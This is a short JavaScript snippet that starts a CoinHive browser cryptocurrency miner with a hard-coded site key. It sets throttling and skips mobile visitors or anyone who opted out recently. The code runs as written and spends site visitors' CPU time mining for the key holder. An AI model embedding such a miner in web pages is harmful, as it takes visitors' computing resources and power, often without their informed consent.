var miner = new CoinHive.User('KeBWtYMqmGJ5ecpfWcfegdHcgmhTdfrO', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}